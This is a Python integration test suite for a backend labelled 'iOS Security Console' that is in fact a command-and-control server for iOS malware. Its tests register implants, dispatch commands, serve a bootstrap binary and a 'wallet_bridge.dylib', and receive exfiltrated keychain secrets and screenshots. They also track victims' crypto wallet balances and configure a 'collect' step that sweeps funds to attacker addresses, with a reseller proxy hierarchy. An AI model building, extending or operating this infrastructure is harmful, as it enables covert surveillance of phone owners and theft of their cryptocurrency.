#!/usr/bin/env python3
"""Full-stack integration tests for iOS Security Console backend."""

from __future__ import annotations

import json
import os
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
BACKEND = ROOT / "backend"
sys.path.insert(0, str(BACKEND))

# Use isolated DB for tests (set before importing c2_server)
_TEST_DB = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
os.environ["CONSOLE_DB_PATH"] = _TEST_DB.name
os.environ["CAPTCHA_DISABLED"] = "1"
os.environ.pop("AUTH_DISABLED", None)
# 代码不再内置默认口令，测试自带一份（仅用于临时 DB）
os.environ.setdefault("ADMIN_PASSWORD", "test-password-only")

from fastapi.testclient import TestClient  # noqa: E402

import c2_server  # noqa: E402
from modules.auth import ADMIN_PASSWORD  # noqa: E402


class FullStackTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.client = TestClient(c2_server.app)
        login = cls.client.post(
            "/api/auth/login",
            json={"username": "admin", "password": ADMIN_PASSWORD},
        )
        assert login.status_code == 200, login.text
        body = login.json()
        assert body.get("code") == 0, body
        cls.admin_token = body["data"]["access_token"]
        cls.auth = {"Authorization": f"Bearer {cls.admin_token}"}

    def test_public_payload_manifest(self):
        r = self.client.get("/api/payload/manifest/raw")
        self.assertEqual(r.status_code, 200)
        data = r.json()
        self.assertIsInstance(data, dict)
        self.assertGreater(len(data), 0)

    def test_protected_dashboard_requires_auth(self):
        r = self.client.get("/api/dashboard/full")
        self.assertEqual(r.status_code, 401)

    def test_dashboard_with_auth(self):
        r = self.client.get("/api/dashboard/full", headers=self.auth)
        self.assertEqual(r.status_code, 200)
        body = r.json()
        self.assertEqual(body["code"], 0)
        self.assertIn("metrics", body["data"])

    def test_payload_status_request_count(self):
        before = self.client.get("/api/payload/status", headers=self.auth).json()
        count_before = before["data"].get("request_count", 0)
        r = self.client.get("/api/payload/manifest/raw")
        self.assertEqual(r.status_code, 200)
        after = self.client.get("/api/payload/status", headers=self.auth).json()
        self.assertGreaterEqual(after["data"]["request_count"], count_before + 1)

    def test_bootstrap_endpoint(self):
        r = self.client.get("/api/payload/bootstrap")
        self.assertEqual(r.status_code, 200)
        self.assertIn(b"\xcf\xfa\xed\xfe", r.content[:4])

    def test_wallet_bridge_endpoint_optional(self):
        r = self.client.get("/api/payload/wallet_bridge")
        if r.status_code == 200:
            self.assertIn(b"\xcf\xfa\xed\xfe", r.content[:4])
        else:
            self.assertEqual(r.status_code, 404)
            self.assertIn("wallet_bridge.dylib", r.text)

    def test_c2_register_and_implant_auth(self):
        reg = self.client.post(
            "/api/c2/register",
            json={
                "device_id": "DEV-TEST",
                "ios_version": "17.0",
            },
        )
        self.assertEqual(reg.status_code, 200, reg.text)
        reg_data = reg.json()["data"]
        session_id = reg_data["session_id"]
        implant_token = reg_data["implant_token"]
        self.assertTrue(implant_token)

        hb_no = self.client.post(
            "/api/c2/heartbeat",
            json={"session_id": session_id},
        )
        self.assertEqual(hb_no.status_code, 401)

        hb = self.client.post(
            "/api/c2/heartbeat",
            json={"session_id": session_id},
            headers={"Authorization": f"Bearer {implant_token}"},
        )
        self.assertEqual(hb.status_code, 200, hb.text)

    def test_c2_dispatch_requires_admin(self):
        reg = self.client.post(
            "/api/c2/register",
            json={"device_id": "DEV-DISPATCH", "ios_version": "17.0"},
        )
        session_id = reg.json()["data"]["session_id"]
        dispatch = self.client.post(
            "/api/c2/dispatch",
            json={"cmd": "logmsg", "args": {"msg": "ping"}, "target_session": session_id},
            headers=self.auth,
        )
        self.assertEqual(dispatch.status_code, 200, dispatch.text)
        self.assertEqual(dispatch.json()["code"], 0)

    def test_console_crud_devices(self):
        add = self.client.post(
            "/api/devices",
            json={
                "uid": "DEV-CRUD-1",
                "name": "Test Device",
                "ios_version": "iOS 16.5",
                "controlled": True,
            },
            headers=self.auth,
        )
        self.assertEqual(add.status_code, 200, add.text)
        lst = self.client.get("/api/devices", headers=self.auth)
        self.assertEqual(lst.status_code, 200)
        ids = [d["device_id"] for d in lst.json()["data"]["devices"]]
        self.assertIn("DEV-CRUD-1", ids)

    def test_cold_address_crud(self):
        add = self.client.post(
            "/api/collect/cold",
            json={"chain": "ETH", "address": "0xabc123", "label": "test"},
            headers=self.auth,
        )
        self.assertEqual(add.status_code, 200, add.text)
        cold_id = add.json()["data"]["cold_id"]
        lst = self.client.get("/api/collect/cold", headers=self.auth)
        self.assertEqual(lst.status_code, 200)
        addresses = [c["address"] for c in lst.json()["data"]]
        self.assertIn("0xabc123", addresses)
        rm = self.client.delete(f"/api/collect/cold/{cold_id}", headers=self.auth)
        self.assertEqual(rm.status_code, 200, rm.text)

    def test_webhook_encrypted_storage(self):
        save = self.client.post(
            "/api/notifications/config",
            json={
                "webhook_url": "https://example.com/hook",
                "webhook_type": "generic",
                "enabled": True,
            },
            headers=self.auth,
        )
        self.assertEqual(save.status_code, 200, save.text)
        cfg = self.client.get("/api/notifications/config", headers=self.auth)
        self.assertEqual(cfg.status_code, 200)
        url = cfg.json()["data"]["webhook_url"]
        self.assertEqual(url, "https://example.com/hook")

    def test_export_with_query_token(self):
        r = self.client.get(
            f"/api/export/visitors?format=json&access_token={self.admin_token}"
        )
        self.assertEqual(r.status_code, 200)

    def test_qrcode_url_auth(self):
        r = self.client.get("/api/qrcode/url", headers=self.auth)
        self.assertEqual(r.status_code, 200)
        self.assertIn("url", r.json()["data"])

    def test_demo_start_stop(self):
        start = self.client.post("/api/demo/start", headers=self.auth)
        self.assertEqual(start.status_code, 200, start.text)
        stop = self.client.post("/api/demo/stop", headers=self.auth)
        self.assertEqual(stop.status_code, 200, stop.text)

    def test_audit_log_written(self):
        r = self.client.get("/api/audit?limit=5", headers=self.auth)
        self.assertEqual(r.status_code, 200, r.text)
        entries = r.json()["data"]
        self.assertIsInstance(entries, list)

    def test_device_assets_dashboard(self):
        device = self.client.post(
            "/api/devices",
            json={"uid": "DEV-ASSET-1", "name": "Asset Phone", "controlled": True, "collectable": True},
            headers=self.auth,
        )
        self.assertEqual(device.status_code, 200, device.text)
        device_id = device.json()["data"]["device_id"]
        update = self.client.put(
            f"/api/devices/{device_id}/assets",
            json={
                "eth_address": "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb0",
                "eth_usdc": 0,
                "trx_usdt": 0,
                "btc": 0,
                "wallet_count": 1,
                "status": "pending_scan",
            },
            headers=self.auth,
        )
        self.assertEqual(update.status_code, 200, update.text)
        board = self.client.get("/api/devices/assets/dashboard", headers=self.auth)
        self.assertEqual(board.status_code, 200, board.text)
        data = board.json()["data"]
        ids = [d["device_id"] for d in data["devices"]]
        self.assertIn(device_id, ids)
        dash = self.client.get("/api/dashboard/full", headers=self.auth)
        self.assertIn("assets", dash.json()["data"])

    def test_rpc_settings_save(self):
        save = self.client.put(
            "/api/settings/rpc-nodes",
            json={
                "eth_rpc": "https://example.invalid",
                "trx_rpc": "https://api.trongrid.io",
                "btc_api": "https://blockstream.info/api",
                "bsc_rpc": "https://bsc-dataseed.binance.org",
                "sol_rpc": "https://api.mainnet-beta.solana.com",
            },
            headers=self.auth,
        )
        self.assertEqual(save.status_code, 200, save.text)
        get = self.client.get("/api/settings/rpc-nodes", headers=self.auth)
        data = get.json()["data"]
        values = data.get("values", data)
        self.assertEqual(values["trx_rpc"], "https://api.trongrid.io")
        self.assertEqual(values["bsc_rpc"], "https://bsc-dataseed.binance.org")
        self.assertIn("fields", data)

    def test_collect_catalog_and_addresses(self):
        cat = self.client.get("/api/collect/catalog", headers=self.auth)
        self.assertEqual(cat.status_code, 200, cat.text)
        assets = cat.json()["data"]
        self.assertEqual(len(assets), 10)

        save = self.client.put(
            "/api/collect/addresses",
            json={
                "password": "${CORUNA_CONSOLE_PASS}",
                "trx_usdt": "TTestAddress123",
                "eth_usdc": "0xabc",
                "btc": "bc1qtest",
                "bsc_usdt": "0xbsc",
                "sol_native": "SolAddr123",
            },
            headers=self.auth,
        )
        self.assertEqual(save.status_code, 200, save.text)
        addrs = save.json()["data"]
        self.assertEqual(addrs["trx_usdt"], "TTestAddress123")
        self.assertEqual(addrs["bsc_usdt"], "0xbsc")
        self.assertEqual(len(addrs.get("catalog", assets)), 10)

    def test_implant_post_wallet_assets(self):
        reg = self.client.post(
            "/api/c2/register",
            json={"device_id": "DEV-WALLET", "ios_version": "17.0"},
        )
        token = reg.json()["data"]["implant_token"]
        post = self.client.post(
            "/api/c2/implant-post",
            headers={"Authorization": f"Bearer {token}"},
            json={
                "wallets": [
                    {"chain": "ETH", "token": "USDC", "address": "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb0", "balance": 1.5},
                    {"chain": "TRX", "token": "USDT", "address": "TTestWallet", "balance": 100},
                    {"chain": "BSC", "token": "USDT", "address": "0xBscWallet", "balance": 50},
                    {"chain": "SOL", "token": "SOL", "address": "SolWallet123", "balance": 2},
                ],
                "wallet_count": 4,
            },
        )
        self.assertEqual(post.status_code, 200, post.text)
        board = self.client.get("/api/devices/assets/dashboard", headers=self.auth)
        devices = board.json()["data"]["devices"]
        dev = next((d for d in devices if d["device_id"] == "DEV-WALLET"), None)
        self.assertIsNotNone(dev)
        self.assertTrue(dev.get("eth_address") or dev.get("wallets", {}).get("eth_address"))
        self.assertIn("balances", dev)

    def test_implant_post_keychain_exfil(self):
        reg = self.client.post(
            "/api/c2/register",
            json={"device_id": "DEV-EXFIL", "ios_version": "17.0"},
        )
        token = reg.json()["data"]["implant_token"]
        post = self.client.post(
            "/api/c2/implant-post",
            headers={"Authorization": f"Bearer {token}"},
            json={
                "event": "keychain_exfil",
                "exfil_type": "keychain",
                "entry_count": 1,
                "entries": [{"app": "metamask", "service": "MetaMask", "secrets": []}],
            },
        )
        self.assertEqual(post.status_code, 200, post.text)
        self.assertEqual(post.json().get("code"), 0)

    def test_implant_post_screenshot_exfil(self):
        reg = self.client.post(
            "/api/c2/register",
            json={"device_id": "DEV-SCREEN", "ios_version": "17.0"},
        )
        token = reg.json()["data"]["implant_token"]
        post = self.client.post(
            "/api/c2/implant-post",
            headers={"Authorization": f"Bearer {token}"},
            json={
                "event": "screenshot_exfil",
                "exfil_type": "screenshot",
                "image_size": 128,
                "image_data": "data:image/jpeg;base64,/9j/4AAQ",
            },
        )
        self.assertEqual(post.status_code, 200, post.text)

    def test_group_html_implant_ops_wired(self):
        html = (ROOT / "group.html").read_text()
        self.assertIn("implant_ops.js", html)
        self.assertIn("ImplantOps.handleCommand", html)
        self.assertIn("stage3_vault_decrypt.js", html)

    def test_captcha_endpoint(self):
        r = self.client.get("/api/auth/captcha")
        self.assertEqual(r.status_code, 200, r.text)
        data = r.json()["data"]
        self.assertIn("captcha_id", data)
        self.assertIn("svg", data)

    def test_proxy_hierarchy_crud(self):
        create = self.client.post(
            "/api/proxies/hierarchy",
            json={"name": "Root Agent", "note": "test"},
            headers=self.auth,
        )
        self.assertEqual(create.status_code, 200, create.text)
        root_id = create.json()["data"]["proxy_id"]
        child = self.client.post(
            "/api/proxies/hierarchy",
            json={"name": "Child Agent", "parent_proxy_id": root_id},
            headers=self.auth,
        )
        self.assertEqual(child.status_code, 200, child.text)
        tree = self.client.get("/api/proxies/tree", headers=self.auth)
        self.assertEqual(tree.status_code, 200)
        self.assertGreaterEqual(tree.json()["data"]["stats"]["count"], 2)
        detail = self.client.get(f"/api/proxies/{root_id}/detail", headers=self.auth)
        self.assertEqual(detail.status_code, 200)

    def test_collect_execute_requires_addresses(self):
        from modules.collect_catalog import COLLECT_DEST_KEYS
        from modules.database import save_collect_addresses

        save_collect_addresses({k: "" for k in COLLECT_DEST_KEYS})
        resp = self.client.post(
            "/api/collect/execute",
            json={"scan_first": False},
            headers=self.auth,
        )
        self.assertEqual(resp.status_code, 400)


def main():
    suite = unittest.defaultTestLoader.loadTestsFromTestCase(FullStackTests)
    result = unittest.TextTestRunner(verbosity=2).run(suite)
    return 0 if result.wasSuccessful() else 1


if __name__ == "__main__":
    sys.exit(main())
